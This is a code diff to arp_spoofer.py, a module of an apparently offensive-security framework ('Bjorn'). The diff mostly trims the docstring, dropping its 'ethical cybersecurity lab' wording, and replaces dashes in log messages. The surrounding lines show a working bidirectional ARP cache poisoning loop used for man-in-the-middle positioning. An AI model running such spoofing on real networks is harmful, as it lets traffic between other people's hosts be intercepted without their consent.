@@ -1,15 +1,6 @@
-"""
-arp_spoofer.py — ARP Cache Poisoning for Man-in-the-Middle positioning.
+"""arp_spoofer.py - Bidirectional ARP cache poisoning for MITM positioning.
 
-Ethical cybersecurity lab action for Bjorn framework.
-Performs bidirectional ARP spoofing between a target host and the network
-gateway. Restores ARP tables on completion or interruption.
-
-SQL mode:
-- Orchestrator provides (ip, port, row) for the target host.
-- Gateway IP is auto-detected from system routing table or shared config.
-- Results persisted to JSON output and logged for RL training.
-- Fully integrated with EPD display (progress, status, comments).
+Spoofs target<->gateway ARP entries; auto-restores tables on exit.
 """
 
 import os
@@ -104,7 +95,7 @@ class ARPSpoof:
             from scapy.all import ARP, Ether, sendp, sr1  # noqa: F401
             self._scapy_ok = True
         except ImportError:
-            logger.error("scapy not available — ARPSpoof will not function")
+            logger.error("scapy not available - ARPSpoof will not function")
             self._scapy_ok = False
 
     # ─────────────────── Identity Cache ──────────────────────
@@ -231,7 +222,7 @@ class ARPSpoof:
                 logger.error(f"Cannot detect gateway for ARP spoof on {ip}")
                 return "failed"
             if gateway_ip == ip:
-                logger.warning(f"Target {ip} IS the gateway — skipping")
+                logger.warning(f"Target {ip} IS the gateway - skipping")
                 return "failed"
 
             logger.info(f"ARP Spoof: target={ip} gateway={gateway_ip}")
@@ -252,7 +243,7 @@ class ARPSpoof:
                 return "failed"
 
             self.shared_data.bjorn_progress = "20%"
-            logger.info(f"Resolved — target_mac={target_mac}, gateway_mac={gateway_mac}")
+            logger.info(f"Resolved - target_mac={target_mac}, gateway_mac={gateway_mac}")
             self.shared_data.log_milestone(b_class, "PoisonActive", f"MACs resolved, starting spoof")
 
             # 3) Spoofing loop
@@ -263,7 +254,7 @@ class ARPSpoof:
 
             while (time.time() - start_time) < duration:
                 if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit — stopping ARP spoof")
+                    logger.info("Orchestrator exit - stopping ARP spoof")
                     break
                 self._send_arp_poison(ip, target_mac, gateway_ip, iface)
                 self._send_arp_poison(gateway_ip, gateway_mac, ip, iface)
